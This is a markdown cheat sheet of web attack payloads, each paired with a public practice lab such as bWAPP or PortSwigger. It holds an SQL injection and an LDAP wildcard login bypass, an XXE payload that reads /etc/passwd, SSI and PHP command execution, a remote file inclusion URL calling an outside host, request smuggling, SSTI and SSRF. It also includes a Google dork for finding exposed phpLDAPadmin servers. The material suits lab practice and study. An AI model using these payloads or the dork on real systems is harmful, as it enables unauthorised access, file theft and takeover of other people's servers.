# Cross Site Scripting (Reflected & Stored)
Lab : http://testphp.vulnweb.com/index.php
Defacement : 
<style>
div {
 background-image: url('http://www.deepeddy.net/img/deepeddyfish.gif');
}
</style>

# HTTP Parameter Pollution
Lab : https://bwapp.hakhub.net/hpp-1.php
Payload : &movie=2

# SQL Injection
Lab : https://juice-shop.herokuapp.com/#/login
Payload : admin' or '1'='1'--

# LDAP Injection

Google Dork - 
intitle:"phpLDAPadmin" inurl:cmd.php

Login Bypass - 
user=*
password=*
--> (&(user=*)(password=*))

# XML Injection
Lab : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
Payload :
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
&xxe;

# XPATH Injection
Lab : https://bwapp.hakhub.net/xmli_1.php
Payload : ' or id='1

# SSI Injection 
Payload : <!--#exec cmd="OS_COMMAND" -->

# Code Injection
Lab : https://bwapp.hakhub.net/phpi.php
Payload : system("ls")

# Local File Inclusion/ Remote File Inclusion
Lab: https://bwapp.hakhub.net/rlfi.php
http://zero.webappsecurity.com:8080/help.html?topic=http://bxss.me/t/fit.txt%3F.html

# Command Injection
Lab : https://bwapp.hakhub.net/commandi.php

# HTTP Smuggling
Lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
Payload : 
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

# Host Header Injection
Lab : https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning

# Server-side Template Injection
Lab : https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
Payload : <%= 7*7 %> 

# Server-Side Request Forgery
Lab : https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
Payload : http://localhost/admin

# IMAP SMTP Injection

# HTTP Incoming Request
